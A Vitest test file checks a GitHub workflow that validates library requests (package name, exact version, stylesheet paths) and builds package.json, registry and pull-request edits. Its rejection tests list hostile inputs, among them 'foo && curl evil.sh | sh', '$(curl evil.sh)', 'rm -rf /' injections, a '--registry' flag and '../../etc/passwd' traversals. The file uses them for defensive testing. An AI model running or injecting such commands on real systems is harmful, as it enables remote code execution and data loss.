import { readFileSync } from "node:fs";
import { join } from "node:path";
import ts from "typescript";
import { describe, expect, it } from "vitest";
import * as core from "@design-harness/core";
import { draftRoles, missingRoleEffects, BUILT_IN_RULES, type LibraryDescription } from "@design-harness/core";
import { LIMITS, REQUEST_LABEL, parseRequestIssue, requestBranch, requestIssueUrl, requestIssuesUrl, requestPullsUrl, requestTitle, validateLibraryRequest, type LibraryRequest } from "../../scripts/library-request-input.mjs";
import {
  E2E_TEST,
  addRegistryEntry,
  addToPackageJson,
  allowedChanges,
  changedPaths,
  descriptionPath,
  draftProblems,
  isListed,
  lockedVersion,
  manifestProblems,
  needsChecking,
  pullRequestBody,
  registryEntry,
  registryId,
  registryIds,
  reportText,
  requestFromEvent,
  rootCandidates,
  servedVersions,
  stopComment,
  summaryOf,
} from "../../scripts/library-request.mjs";
import { vendoredLibraries } from "../../scripts/vendor-libraries.mjs";

/**
 * The library request: the wizard's check of what a designer types, the
 * issue form's text read back, and the workflow's edits and words. The
 * issue is written by anyone, so the checks are held to hostile input too.
 */
const web = join(import.meta.dirname, "..", "..");
const root = join(web, "..", "..");
const packageJson = JSON.parse(readFileSync(join(web, "package.json"), "utf8")) as { dependencies: Record<string, string>; designHarness: { libraries: Record<string, Record<string, string[]>> } };
const registrySource = readFileSync(join(web, "src", "libraries", "registry.ts"), "utf8");
const todae = JSON.parse(readFileSync(join(root, "packages", "core", "libraries", "todae-0.11.3.json"), "utf8")) as LibraryDescription;
const request = (fields: { package?: string; version?: string; stylesheets?: string }) => validateLibraryRequest({ package: "@acme/ui", version: "1.2.3", stylesheets: "dist/ui.css", ...fields });
const errorsOf = (fields: Parameters<typeof request>[0]) => {
  const result = request(fields);
  return result.ok ? [] : result.errors.map((error) => `${error.field}: ${error.message}`);
};
const ACME: LibraryRequest = { package: "@acme/ui", version: "1.2.3", stylesheets: ["dist/ui.css"] };

/** The body GitHub writes for an issue made from the form. */
const issueBody = (fields: { package: string; version: string; stylesheets: string }) => `### Package\n\n${fields.package}\n\n### Exact version\n\n${fields.version}\n\n### Stylesheets\n\n${fields.stylesheets}`;

describe("what a designer types", () => {
  it("takes a package name, an exact version and stylesheet paths inside the package", () => {
    expect(request({})).toEqual({ ok: true, value: ACME });
    expect(validateLibraryRequest({ package: " clsx ", version: " 2.1.1 ", stylesheets: "" })).toEqual({ ok: true, value: { package: "clsx", version: "2.1.1", stylesheets: [] } });
    expect(request({ version: "2.0.0-beta.1", stylesheets: "styles.css, dist/a/b.css\n\n  dist/@x/c_d-e.css  " })).toEqual({ ok: true, value: { ...ACME, version: "2.0.0-beta.1", stylesheets: ["styles.css", "dist/a/b.css", "dist/@x/c_d-e.css"] } });
    expect(request({ package: "@mantine/core", version: "0.0.0" }).ok).toBe(true);
  });

  it("refuses a range or a tag, which can mean another version tomorrow, in words that say which", () => {
    for (const range of ["^1.2.3", "~1.2.3", ">=1.2.3", "<2", "*", "1.x", "1.2.x", "1.2", "1", "1.2.3 - 2.0.0", "1.2.3 || 2.0.0", "=1.2.3"]) expect(errorsOf({ version: range }), range).toEqual([expect.stringMatching(/^version: .*is a range/)]);
    for (const tag of ["latest", "next", "beta", "canary"]) expect(errorsOf({ version: tag }), tag).toEqual([expect.stringMatching(/^version: .*is a tag, which moves/)]);
    expect(errorsOf({ version: "v1.2.3" })).toEqual(['version: Write the version without the "v": 1.2.3.']);
    expect(errorsOf({ version: "1.2.3+build.5" })).toEqual(["version: Give the version without build metadata (the part after +)."]);
    expect(errorsOf({ version: "1.2.3-RC.1" })).toEqual([expect.stringMatching(/lowercase only/)]);
    expect(errorsOf({ version: "01.2.3" })).toEqual([expect.stringMatching(/is not an exact version/)]);
    expect(errorsOf({ version: "" })).toEqual(["version: Give the exact version, such as 9.7.4."]);
  });

  it("refuses a name that is not a package name this form takes: shell, flags, paths, URLs, case, characters a branch cannot hold", () => {
    const hostile = ["foo; rm -rf /", "$(id)", "`id`", "foo && curl evil.sh | sh", "-rf", "--registry=https://evil.example", "../x", "@scope/../x", "@scope/x/y", "a\nb", "a b", "foo.", "@x./y", "a..b", "a~b", ".hidden", "_private", "@/x", "x.lock", "node_modules", "file:../x", "git+https://github.com/x/y", "https://evil.example/x.tgz", "npm:react@19", "é", "a'b", 'a"b', "a\u0000b"];
    for (const name of hostile) expect(errorsOf({ package: name }), JSON.stringify(name)).toEqual([expect.stringMatching(/^package: /)]);
    expect(errorsOf({ package: "React" })).toEqual(['package: npm package names are lowercase: "react".']);
    expect(errorsOf({ package: "react@19.3.1" })).toEqual(["package: Give the name alone here, and the version in its own field."]);
    expect(errorsOf({ package: "" })).toEqual(["package: Give the package's name on npm, such as @mantine/core."]);
    expect(errorsOf({ package: "x".repeat(215) })).toEqual([`package: A package name on npm is at most ${LIMITS.package} characters.`]);
  });

  it("refuses a stylesheet outside the package, not a .css file, or one a command could misread", () => {
    for (const path of ["../../etc/passwd.css", "/abs.css", "dist\\ui.css", "./dist/ui.css", "dist/../ui.css", "dist/./ui.css", "dist/.hidden.css", ".css", "dist//ui.css", "$(id).css", "dist/ui .css", "~/ui.css", "dist/%2e%2e/ui.css"]) {
      expect(errorsOf({ stylesheets: path }), path).toEqual([expect.stringMatching(/^stylesheets: .*not a path inside the package/)]);
    }
    for (const path of ["dist/ui.js", "dist/ui.css; rm -rf /", "dist/ui.css?x"]) expect(errorsOf({ stylesheets: path }), path).toEqual([expect.stringMatching(/is not a \.css file/)]);
    expect(errorsOf({ stylesheets: "a.css\na.css" })).toEqual(["stylesheets: A stylesheet is named twice."]);
    expect(errorsOf({ stylesheets: ["a", "b", "c", "d", "e", "f"].map((name) => `${name}.css`).join("\n") })).toEqual([`stylesheets: Name at most ${LIMITS.stylesheets} stylesheets.`]);
  });

  it("refuses huge input before matching it, and shows back no more than a line of what was typed", () => {
    const huge = "a".repeat(1_000_000);
    const started = performance.now();
    expect(errorsOf({ package: huge, version: huge, stylesheets: huge })).toEqual(["package: That is far longer than this field ever needs.", "version: That is far longer than this field ever needs.", "stylesheets: That is far longer than this field ever needs."]);
    expect(errorsOf({ version: `1.2.3${"-a".repeat(30)}!` })[0]?.length).toBeLessThan(200);
    expect(errorsOf({ package: `${"x ".repeat(40)}\`@everyone\`` })[0]).not.toMatch(/`/);
    expect(performance.now() - started).toBeLessThan(500);
    expect(validateLibraryRequest({ package: 42, version: null, stylesheets: {} }).ok).toBe(false);
  });

  it("opens the issue form filled in, and links where its issue and pull request will be", () => {
    const url = new URL(requestIssueUrl({ ...ACME, stylesheets: ["dist/ui.css", "dist/theme.css"] }));
    expect(`${url.origin}${url.pathname}`).toBe("https://github.com/tounsoo/design-harness/issues/new");
    expect(Object.fromEntries(url.searchParams)).toEqual({ template: "library-request.yml", title: "Library request: @acme/ui 1.2.3", package: "@acme/ui", version: "1.2.3", stylesheets: "dist/ui.css\ndist/theme.css" });
    expect(requestTitle(ACME)).toBe("Library request: @acme/ui 1.2.3");
    expect(requestBranch(ACME)).toBe("library-request/@acme/ui-1.2.3");
    expect(decodeURIComponent(requestIssuesUrl(ACME))).toBe('https://github.com/tounsoo/design-harness/issues?q=is:issue label:library-request in:title "@acme/ui 1.2.3"');
    expect(decodeURIComponent(requestPullsUrl(ACME))).toBe("https://github.com/tounsoo/design-harness/pulls?q=is:pr head:library-request/@acme/ui-1.2.3");
  });

  it("names the label and form fields the issue template has", () => {
    const template = readFileSync(join(root, ".github", "ISSUE_TEMPLATE", "library-request.yml"), "utf8");
    expect(template).toContain(`labels: ["${REQUEST_LABEL}"]`);
    for (const [id, label] of [["package", "Package"], ["version", "Exact version"], ["stylesheets", "Stylesheets"]]) expect(template).toMatch(new RegExp(`id: ${id}\\n {4}attributes:\\n {6}label: ${label}\\n`));
  });
});

describe("the issue read back", () => {
  it("reads the fields GitHub writes under their headings, and checks them as the wizard does", () => {
    expect(parseRequestIssue(issueBody({ package: "@acme/ui", version: "1.2.3", stylesheets: "dist/ui.css" }))).toEqual({ ok: true, value: ACME });
    expect(parseRequestIssue(issueBody({ package: "@acme/ui", version: "1.2.3", stylesheets: "_No response_" }))).toEqual({ ok: true, value: { ...ACME, stylesheets: [] } });
    expect(parseRequestIssue(issueBody({ package: "@acme/ui", version: "1.2.3", stylesheets: "```\ndist/ui.css\n```" }))).toEqual({ ok: true, value: ACME });
    expect(parseRequestIssue(issueBody({ package: "@acme/ui", version: "1.2.3", stylesheets: "dist/ui.css" }).replace(/\n/g, "\r\n"))).toEqual({ ok: true, value: ACME });
    expect(parseRequestIssue(`${issueBody({ package: "@acme/ui", version: "1.2.3", stylesheets: "dist/ui.css" })}\n\n### Something else\n\nanything`)).toEqual({ ok: true, value: ACME });
  });

  it("refuses an issue not made from the form, a field given twice, a hostile value, and a huge body", () => {
    expect(parseRequestIssue("Please add Mantine 9")).toEqual({ ok: false, errors: [expect.objectContaining({ field: "package" }), expect.objectContaining({ field: "version" }), expect.objectContaining({ field: "stylesheets" })] });
    expect(parseRequestIssue(`${issueBody({ package: "@acme/ui", version: "1.2.3", stylesheets: "" })}\n\n### Package\n\nevil`)).toEqual({ ok: false, errors: [{ field: "package", message: 'The issue has the "Package" field 2 times. Keep one.' }] });
    expect(parseRequestIssue(issueBody({ package: "@acme/ui\n$(curl evil.sh)", version: "1.2.3", stylesheets: "" })).ok).toBe(false);
    expect(parseRequestIssue(issueBody({ package: "@acme/ui", version: "^1.2.3", stylesheets: "../../../.github/workflows/ci.css" }))).toEqual({ ok: false, errors: [expect.objectContaining({ field: "version" }), expect.objectContaining({ field: "stylesheets" })] });
    expect(parseRequestIssue("x".repeat(LIMITS.body + 1))).toEqual({ ok: false, errors: [expect.objectContaining({ field: "issue" })] });
    for (const body of [undefined, null, 42, ""]) expect(parseRequestIssue(body).ok).toBe(false);
  });
});

describe("which events the workflow answers", () => {
  const event = (overrides: Record<string, unknown> = {}, issue: Record<string, unknown> = {}) => ({ action: "opened", ...overrides, issue: { number: 12, state: "open", labels: [{ name: REQUEST_LABEL }], body: issueBody({ package: "@acme/ui", version: "1.2.3", stylesheets: "dist/ui.css" }), ...issue } });

  it("goes on with a request made from the form, opened or with its fields edited", () => {
    expect(requestFromEvent(event(), "issues")).toEqual({ go: true, issue: 12, request: ACME });
    expect(requestFromEvent(event({ action: "edited", changes: { body: { from: "" } } }), "issues")).toEqual({ go: true, issue: 12, request: ACME });
  });

  it("is quiet about another issue, a closed one, a pull request, a title edit and another event", () => {
    expect(requestFromEvent(event({}, { labels: [{ name: "bug" }] }), "issues")).toMatchObject({ go: false, quiet: "not labelled library-request" });
    expect(requestFromEvent(event({}, { state: "closed" }), "issues")).toMatchObject({ go: false, quiet: "the issue is closed" });
    expect(requestFromEvent(event({}, { pull_request: {} }), "issues")).toMatchObject({ go: false, issue: null });
    expect(requestFromEvent(event({ action: "edited", changes: { title: { from: "x" } } }), "issues")).toMatchObject({ go: false, quiet: "the edit left the fields as they were" });
    expect(requestFromEvent(event({ action: "labeled" }), "issues")).toMatchObject({ go: false, quiet: "the issue was labeled" });
    expect(requestFromEvent(event(), "issue_comment")).toMatchObject({ go: false, issue: null });
    expect(requestFromEvent({}, "issues")).toMatchObject({ go: false, issue: null });
    expect(requestFromEvent(event({}, { number: "12; rm -rf /" }), "issues")).toMatchObject({ go: false, issue: null });
  });

  it("says why on the issue when the request is written wrong, or is not a component library", () => {
    const wrong = requestFromEvent(event({}, { body: issueBody({ package: "@acme/ui", version: "latest", stylesheets: "" }) }), "issues");
    expect(wrong).toMatchObject({ go: false, issue: 12 });
    expect(wrong.go ? "" : wrong.reason).toMatch(/^The request cannot go on as it is written:\n- "latest" is a tag, which moves.*\n\nEdit the issue to fix it, and the workflow runs again\.$/s);
    expect(requestFromEvent(event({}, { body: issueBody({ package: "react", version: "19.3.1", stylesheets: "" }) }), "issues")).toMatchObject({ go: false, reason: "react is not a component library: the app serves it for itself." });
  });
});

describe("the edits the workflow makes", () => {
  it("adds a new package under its own name, and another version of a served one under its alias", () => {
    const added = addToPackageJson(packageJson, ACME);
    expect(added.install).toBe("@acme/ui");
    expect(added.packageJson.dependencies["@acme/ui"]).toBe("1.2.3");
    expect(Object.keys(added.packageJson.dependencies)).toEqual(Object.keys(added.packageJson.dependencies).sort());
    expect(added.packageJson.designHarness.libraries["@acme/ui"]).toEqual({ "1.2.3": ["dist/ui.css"] });
    expect(vendoredLibraries(added.packageJson).at(-1)).toEqual({ package: "@acme/ui", version: "1.2.3", install: "@acme/ui", stylesheets: ["dist/ui.css"] });

    const another = addToPackageJson(packageJson, { package: "@mantine/core", version: "9.8.0", stylesheets: ["styles.css"] });
    expect(another.install).toBe("@mantine/core-9.8.0");
    expect(another.packageJson.dependencies["@mantine/core-9.8.0"]).toBe("npm:@mantine/core@9.8.0");
    expect(another.packageJson.dependencies["@mantine/core"]).toBe("9.7.4");
    expect(another.packageJson.designHarness.libraries["@mantine/core"]).toEqual({ "9.7.4": ["styles.css"], "9.8.0": ["styles.css"] });
    expect(servedVersions(another.packageJson, "@mantine/core")).toEqual(["9.7.4", "9.8.0"]);
    // The original is left as it was.
    expect(servedVersions(packageJson, "@mantine/core")).toEqual(["9.7.4"]);
  });

  it("refuses a version already served", () => {
    expect(() => addToPackageJson(packageJson, { package: "@tounsoo/todae", version: "0.10.1", stylesheets: ["dist/todae.css"] })).toThrow("@tounsoo/todae 0.10.1 is already served by this deployment.");
  });

  it("adds a registry entry that TypeScript parses, with every value a JSON literal and what a person must check", () => {
    const draft = draftRoles(todae);
    const request = { package: "@tounsoo/todae", version: "0.11.2", stylesheets: ["dist/todae.css"] };
    const id = registryId(request, registryIds(registrySource));
    expect(registryIds(registrySource)).toEqual(["todae", "mantine"]);
    expect(id).toBe("tounsoo-todae-0-11-2");
    expect(registryId(request, [id])).toBe(`${id}-2`);
    const entry = registryEntry(request, { ...todae, version: "0.11.2" }, draft, { id, issue: 12 });
    const source = addRegistryEntry(registrySource, entry);
    expect(source.startsWith(registrySource.slice(0, registrySource.indexOf("\n];\n")))).toBe(true);
    expect(source.endsWith(registrySource.slice(registrySource.indexOf("\n];\n")))).toBe(true);
    const file = ts.createSourceFile("registry.ts", source, ts.ScriptTarget.ES2022, true, ts.ScriptKind.TS);
    expect((file as unknown as { parseDiagnostics: readonly unknown[] }).parseDiagnostics).toEqual([]);
    expect(registryIds(source)).toEqual(["todae", "mantine", id]);
    expect(isListed(source, request)).toBe(true);
    expect(isListed(registrySource, request)).toBe(false);
    expect(isListed(registrySource, { package: "@tounsoo/todae", version: "0.11.3", stylesheets: [] })).toBe(true);
    expect(entry).toContain('    describe: async () => (await import("../../../../packages/core/libraries/tounsoo-todae-0.11.2.json")).default as unknown as LibraryDescription,');
    expect(entry).toContain('    about: "Requested in issue #12. Parts are namespaced, such as Button.Root.",');
    expect(entry).toContain("    // Added by the library request workflow from issue #12. A person must check:");
    expect(descriptionPath(request)).toBe("packages/core/libraries/tounsoo-todae-0.11.2.json");
    expect(() => addRegistryEntry("export const OTHER = [];\n", entry)).toThrow("no SHIPPED_LIBRARIES list");
  });

  it("names what a person must check: confidence below high, light and dark, a root part, the library's own rules", () => {
    const draft = draftRoles(todae);
    const check = needsChecking(todae, draft);
    expect(check.filter((line) => line.startsWith("The primary-action role was drafted at medium confidence"))).toHaveLength(1);
    expect(check.some((line) => line.startsWith("Light and dark"))).toBe(true);
    expect(rootCandidates({ package: "x", version: "1.0.0", parts: { MantineProvider: { props: {}, content: "children" }, Theme: { props: {}, content: "children" }, "Theme.Root": { props: {}, content: "children" }, Button: { props: {}, content: "children" } } } as unknown as LibraryDescription)).toEqual(["MantineProvider", "Theme"]);
  });

  it("allows the pull request to change exactly four files, and reads git's status as paths", () => {
    expect(allowedChanges(ACME)).toEqual(["apps/web/package.json", "apps/web/src/libraries/registry.ts", "package-lock.json", "packages/core/libraries/acme-ui-1.2.3.json"]);
    expect(changedPaths(" M apps/web/package.json\n M package-lock.json\n?? packages/core/libraries/acme-ui-1.2.3.json\n M apps/web/src/libraries/registry.ts\n")).toEqual(allowedChanges(ACME));
    expect(changedPaths(" M .github/workflows/ci.yml\n")).toEqual([".github/workflows/ci.yml"]);
    expect(lockedVersion({ packages: { "node_modules/@acme/ui": { version: "1.2.3" } } }, "@acme/ui")).toBe("1.2.3");
    expect(lockedVersion({ packages: { "apps/web/node_modules/@acme/ui-1.2.3": { version: "1.2.3" } } }, "@acme/ui-1.2.3")).toBe("1.2.3");
    expect(lockedVersion({ packages: {} }, "@acme/ui")).toBeNull();
  });
});

describe("what npm says about the version", () => {
  const manifest = { name: "@acme/ui", version: "1.2.3", types: "dist/index.d.ts", peerDependencies: { react: "^18.0.0 || ^19.0.0" } };
  it("takes a version with types of its own that accepts the frames' React", () => {
    expect(manifestProblems(manifest, ACME, "19.3.1")).toEqual([]);
    expect(manifestProblems({ ...manifest, types: undefined, exports: { ".": { import: { types: "./dist/index.d.mts", default: "./dist/index.mjs" } } } }, ACME, "19.3.1")).toEqual([]);
    expect(manifestProblems({ ...manifest, types: undefined, typings: "index.d.ts" }, ACME, "19.3.1")).toEqual([]);
  });
  it("says plainly when it is not there, ships no types, or does not accept the frames' React", () => {
    expect(manifestProblems(null, ACME, "19.3.1")).toEqual(["npm has no @acme/ui 1.2.3. Check the package's name and the version on npmjs.com, and edit the issue."]);
    expect(manifestProblems({ ...manifest, version: "1.2.4" }, ACME, "19.3.1")).toHaveLength(1);
    expect(manifestProblems({ ...manifest, types: undefined, exports: { ".": "./index.js" } }, ACME, "19.3.1")).toEqual([expect.stringMatching(/ships no TypeScript types of its own/)]);
    expect(manifestProblems({ ...manifest, peerDependencies: { react: "^18.2.0" } }, ACME, "19.3.1")).toEqual([expect.stringMatching(/asks for React "\^18\.2\.0", and frames render with React 19\.3\.1/)]);
    expect(manifestProblems({ ...manifest, peerDependencies: { react: ">=16 <20" } }, ACME, "19.3.1")).toEqual([expect.stringMatching(/a range the vendor build cannot read/)]);
    expect(manifestProblems({ ...manifest, deprecated: "use @acme/ui2" }, ACME, "19.3.1")).toEqual(["npm marks @acme/ui 1.2.3 as deprecated."]);
  });
});

describe("the draft core must make of it", () => {
  it("takes a library with a part for every role and a starter that follows the rules", () => {
    expect(draftProblems(todae, { react: "19.3.1", stylesheets: ["dist/todae.css"] }, core).problems).toEqual([]);
  });
  it("stops a library with no components, or a role it found no part for, saying which", () => {
    expect(draftProblems({ package: "x", version: "1.0.0", parts: {} }, { react: "19.3.1", stylesheets: [] }, core).problems).toEqual(["The describer found no React components in x 1.0.0's type declarations."]);
    const onlyButton = { package: "x", version: "1.0.0", parts: { Button: { props: { variant: { type: "enum", values: ["primary", "secondary"], required: false } }, content: "children", events: ["press"] } } } as unknown as LibraryDescription;
    const { problems } = draftProblems(onlyButton, { react: "19.3.1", stylesheets: [] }, core);
    expect(problems[0]).toMatch(/^core found no part for the disclosure role \(/);
    expect(problems[1]).toMatch(/adds only a library whose every role it can draft/);
  });
});

describe("the words the workflow writes", () => {
  it("opens a pull request that links the issue, shows the draft, lists what to check and says CI did not run on it", () => {
    const draft = draftRoles(todae);
    const summary = summaryOf(todae, draft, missingRoleEffects(BUILT_IN_RULES, []));
    expect(summary).toMatchObject({ parts: 203, missing: [], excludedProps: { count: 2, confidence: "high" } });
    const body = pullRequestBody({ request: { package: "@tounsoo/todae", version: "0.11.2", stylesheets: ["dist/todae.css"] }, issue: 12, install: "@tounsoo/todae-0.11.2", before: "2026-10-01T00:00:01.000Z", summary, runUrl: "https://github.com/tounsoo/design-harness/actions/runs/1", files: { description: "packages/core/libraries/tounsoo-todae-0.11.2.json" } });
    expect(body).toContain("Closes #12.");
    expect(body).toContain('the npm alias `"@tounsoo/todae-0.11.2": "npm:@tounsoo/todae@0.11.2"`');
    expect(body).toContain("`--before=2026-10-01T00:00:01.000Z`");
    expect(body).toContain('| primary-action | `Button.Root` with `variant` `"primary"` (or no `variant`) | medium |');
    expect(body).toContain("Style props to exclude from specs: 2, at high confidence.");
    expect(body).toContain(`\`node apps/web/e2e/run.mjs "${E2E_TEST}"\``);
    expect(body).toMatch(/## Unverified checks\n\nThis pull request was opened with the workflow's own token, and GitHub does not start workflows/);
    expect(body).toMatch(/- \[ \] Light and dark/);
  });

  it("says why a run stopped, with the failing output fenced so it cannot close its fence", () => {
    const comment = stopComment({ reason: "With @acme/ui 1.2.3 added, `npm run check` fails.", output: "\u001b[31mFAIL\u001b[0m ``` @everyone ````", runUrl: "https://example/run" });
    expect(comment).toContain("`````text\nFAIL ``` @everyone ````\n`````");
    expect(comment.endsWith("The run: https://example/run")).toBe(true);
    expect(reportText({ parseReason: "Already requested.", outcome: null, runUrl: "u" })).toBe("Already requested.\n\nThe run: u");
    expect(reportText({ buildResult: "failure", outcome: { ok: false, reason: "npm has no x 1.0.0.", output: "" }, runUrl: "u" })).toBe("npm has no x 1.0.0.\n\nThe run: u");
    expect(reportText({ buildResult: "failure", outcome: null, runUrl: "u" })).toBe("The workflow stopped before it could say why.\n\nThe run: u");
    expect(reportText({ buildResult: "success", publishResult: "failure", publishReason: "", outcome: null, runUrl: "u" })).toMatch(/could not open its pull request/);
    expect(reportText({ buildResult: "success", publishResult: "success", outcome: null, runUrl: "u" })).toBeNull();
  });
});
